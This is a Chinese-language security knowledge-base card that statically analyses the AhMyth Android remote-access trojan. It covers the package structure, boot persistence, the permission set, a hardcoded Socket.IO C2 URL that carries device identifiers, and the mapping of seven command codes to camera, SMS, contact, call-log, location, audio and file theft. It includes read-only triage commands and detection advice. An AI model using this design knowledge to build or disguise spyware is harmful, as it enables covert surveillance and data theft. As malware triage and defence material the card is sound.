---
id: mobile-android-ahmyth-rat-static-command-map
title: AhMyth Android RAT 样本静态剖析：ahmyth.mine.king.ahmyth 包结构、IOSocket 设备信息外链与七类 Manager 指令映射
type: scenario
domain: mobile
path: mobile/android
technique: ahmyth-android-rat-static-triage
tags:
- android
- malware
- rat
- static-analysis
- ahmyth
- socket.io
- data-exfiltration
- permission-abuse
cve: []
severity: high
confidence: high
affected_versions: AhMyth v1.0-beta.1（唯一 Release，2017-07-08 发布；2021-09-04 仓库归档）
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V352
  verified_at: '2026-11-09T00:32:14+08:00'
  notes: 已对照原文与图01-22核对：包名 ahmyth.mine.king.ahmyth、MainActivity(singleInstance)/MainService/MyReceiver(BOOT_COMPLETED, exported)、minSdk16/targetSdk23、权限清单、IOSocket 硬编码 URL 与 Build.MODEL/MANUFACTURER/VERSION.RELEASE/android_id 拼接、ConnectionManager order 分派、七个 Manager 的 API/字段（Camera quality20、call_log、ContactsContract.Phone、FileManager、LocationManager、MediaRecorder、sms/inbox+sendTextMessage）均与 JEB 截图一致。PoC 为静态只读命令未执行样本；frontmatter 无 sources/source_url；affected_versions 保留原文明确唯一 Release v1.0-beta.1。dup-scan(19:10)早于本批建卡，无涉及 pair。
url: /docs/mobile/android/mobile-android-ahmyth-rat-static-command-map/
draft: false
kb_aliases:
- AhMyth 样本分析
- AhMyth RAT 静态剖析
- ahmyth.mine.king.ahmyth
- Android RAT 指令映射
- IOSocket 外链
- 开源 Android 远控分析
---

## 一句话结论

AhMyth 生成的 Android 样本是未加壳、可直接静态还原的 Socket.IO 远控客户端：包名 `ahmyth.mine.king.ahmyth`，入口 `MainActivity`，由 `MainService` 常驻后台、`MyReceiver` 监听 `BOOT_COMPLETED` 开机自启；申请短信/通讯录/通话记录/摄像头/录音/定位/存储全套权限；`IOSocket` 把 `Build.MODEL`、`Build.MANUFACTURER`、`Build.VERSION.RELEASE` 与 `Settings.Secure` 的 android_id 拼进硬编码 C2 URL；`ConnectionManager` 在 `order` 事件里按 `x0000ca/cl/cn/fm/lm/mc/sm` 分派到七个 Manager，分别实现拍照、通话记录、通讯录、文件浏览下载、定位、录音与短信窃取。

## 原理

- **组件结构**：Manifest 中 launcher 为 `ahmyth.mine.king.ahmyth.MainActivity`（singleInstance），另有 `MainService` 与 `MyReceiver`；`MyReceiver` 注册 `android.intent.action.BOOT_COMPLETED` 并 `enabled/exported=true`，开机广播即可拉起后台服务，用户无需再次点击图标。样本以 `targetSdkVersion 23 / minSdkVersion 16` 构建，安装时一次性授予全部权限。
- **权限即能力清单**：`READ_SMS`+`SEND_SMS`（读发短信）、`READ_CONTACTS`（通讯录）、`READ_CALL_LOG`（通话记录）、`CAMERA`（拍照）、`RECORD_AUDIO`+`MODIFY_AUDIO_SETTINGS`（录音）、`ACCESS_FINE_LOCATION`（定位）、`READ_EXTERNAL_STORAGE`/`WRITE_EXTERNAL_STORAGE`（文件）、`INTERNET`/`ACCESS_NETWORK_STATE`/`WAKE_LOCK`（外联与保活）。普通应用极少同时申请这组权限，组合本身即为强特征。
- **C2 地址与上线身份**：`ahmyth.mine.king.ahmyth.IOSocket` 构造 socket 时使用 `IO.socket("http://<C2>:<端口>?model=" + Build.MODEL + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + android_id)`，并设置 `reconnection=true`、固定重连间隔；C2 地址硬编码在样本中，设备信息随首次连接一并外发。该 URL 构造方式是静态定位 C2 与识别家族的关键锚点。
- **指令分派**：`ConnectionManager` 对 `ioSocket.on("order", ...)` 注册监听，从回调参数取 `JSONObject` 的 `order` 字段，用 `switch(hashCode)`+`equals` 匹配 `x0000ca`、`x0000cl`、`x0000cn`、`x0000fm`、`x0000lm`、`x0000mc`、`x0000sm`，分别转给对应 Manager（见下表）；处理结果以指令码为事件名回传。
- **各 Manager 的数据来源**：
  - CameraManager：`Camera.open(id)` 拍照，回调用 `BitmapFactory` 解码后压缩为 JPEG（quality 20），以 `{"image":true,"buffer":<bytes>}` emit `x0000ca`。
  - CallsManager：`ContentResolver.query(content://call_log/calls)` 取 `number`/`name`/`duration`/`type`，封装为 `callsList`。
  - ContactsManager：`query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI)` 取 `display_name`/`data`，封装为 `contactsList`。
  - FileManager：`File(path).listFiles()` 遍历目录，输出 `name`/`isDir`/`path` 数组，支持逐级进入与指定文件下载。
  - LocManager：`LocationManager` 请求 network/gps 定位并回传 `getLastKnownLocation` 的经纬度。
  - MicManager：`MediaRecorder`（MIC 音源）录音到应用缓存目录的临时音频文件，读成字节后以 `{"file":true,"name":...}` emit `x0000mc`。
  - SMSManager：`query(content://sms/inbox)` 取 `address`/`body` 封装 `smsList`，并提供 `SmsManager.sendTextMessage` 发短信能力。
- **为什么可静态还原**：该家族由开源工具直接生成，类名、包名、字段名与指令码均未混淆或加壳，JEB/jadx 反编译即可读出全部功能；即使改包名/嵌壳，Manager 的数据源 API 与指令码字符串仍可作为识别依据。

## 触发条件

- 拿到可疑 APK，未加壳或可先脱壳，能反编译出 Java 源码。
- Manifest 中出现上述包名/组件与高危权限组合，或代码中检索到 `ahmyth`、`IOSocket`、`x0000` 指令码、`/socket.io` 等字符串。
- 样本由 AhMyth v1.0-beta.1 或其改版生成；改版可能更换包名、类名、C2 与部分指令码，但数据源与事件分派结构通常保留。
- 分析环境需断网或隔离，禁止在未授权环境运行样本。

## 利用步骤

1. **样本初筛**：计算哈希；`apkid` 查壳，确认无加固后 `apktool`/`jadx` 反编译。
2. **读 Manifest**：记录包名、launcher Activity、`MainService`、监听 `BOOT_COMPLETED` 的 Receiver 与全部权限，先勾出间谍软件画像。
3. **定位 C2**：全局搜索 `IO.socket`、`socket.io`、`android_id`、`Build.MODEL`，找到 `IOSocket` 中的硬编码 URL，提取 IP/端口与查询参数构造方式。
4. **定位指令分派**：搜索 `"order"` 与 `x0000` 字符串，在 `ConnectionManager` 中确认 `order`→Manager 的 switch 映射（可对照本卡表格）。
5. **逐个审计 Manager**：按数据源 API（ContentResolver / Camera / MediaRecorder / LocationManager / File）还原每类指令的采集范围与回传字段。
6. **输出能力清单与 IOC**：包名、组件、权限、C2 地址、指令码、数据字段；与流量侧捕获对照，确认实际执行过的指令。不要在真机执行样本。

## PoC

静态排查命令（不执行样本）：

```bash
apktool d Ahmyth.apk -o out
grep -n "ahmyth\|BOOT_COMPLETED\|android.permission" out/AndroidManifest.xml

jadx -d jadx_out Ahmyth.apk
grep -rn "socket.io\|IO.socket\|android_id\|Build.MODEL" jadx_out/sources
grep -rn "x0000ca\|x0000fm\|x0000sm\|\"order\"" jadx_out/sources
grep -rln "ContactsContract\|content://sms\|content://call_log\|MediaRecorder" jadx_out/sources
```

已安装样本的核验（授权取证环境）：

```bash
adb shell dumpsys package ahmyth.mine.king.ahmyth | grep -i -E "permission|receiver|service"
```

说明：上述为静态/只读排查，不运行恶意样本；实际样本可能改包名，应以 IOSocket 与指令码字符串为准。

## 变体与关联

- **变体（构建期）**：生成器支持把载荷捆绑进第三方正常 APK（Bind With Another APK），并自定义 C2 IP/端口；包名/应用名可伪装成聊天、工具类应用。
- **变体（改版）**：开源仓库于 2021-09-04 归档后仍有二次开发版本，可能更换包名、加密字符串或改用 `wss://`；应以实际样本的 `IOSocket`/`ConnectionManager` 为准。
- **滥用背景**：该远控曾被 APT 组织作为移动端攻击武器使用，样本常伪装成聊天软件通过色情/语音诱导投递。
- 关联：[[defense-forensics-ahmyth-android-rat-socketio-c2-traffic-parse]]（同一家族的明文 Socket.IO 流量解析与指令时间线还原）、[[mobile-android-spymax-telegram-phishing-accessibility-keylogger-gzip-c2]]（另一款 Android RAT 的通信与键盘记录）、[[mobile-android-spynote-fake-police-accessibility-credential-theft]]（SpyNote 无障碍窃密）、[[mobile-android-spyware-clouddisk-contact-sms-photo-exfil]]（ContentResolver 批量窃取类间谍软件）。

## 检测与防御

- **静态检测**：应用商店/EDR 扫描包名 `ahmyth.mine.king.ahmyth`（改包则看 `MainService`+`BOOT_COMPLETED`+权限组合）、`IOSocket`/`x0000` 指令码字符串与硬编码裸 IP C2；对“短信+通讯录+通话记录+录音+定位”全家桶权限组合要求人工复核。
- **网络检测**：设备侧出现 `/socket.io/` 握手且查询串带 `model`/`manf`/`release`/`id` 字段、明文 `42["order"...]` 或 `x0000xx` 指令码时告警并阻断 C2。
- **防御**：用户只从可信渠道安装应用并授予最小权限；企业 MDM 禁止侧载未知来源 APK、限制高危权限组合；Android 新版本的一次性权限/后台限制可降低影响但无法阻止已授权后的窃取。
- **响应**：卸载样本、隔离设备、重置在该设备登录过的账号口令；依据 C2 流量与本地证据评估通讯录/短信/通话/位置/文件/照片/录音的泄露范围并通知受害者。
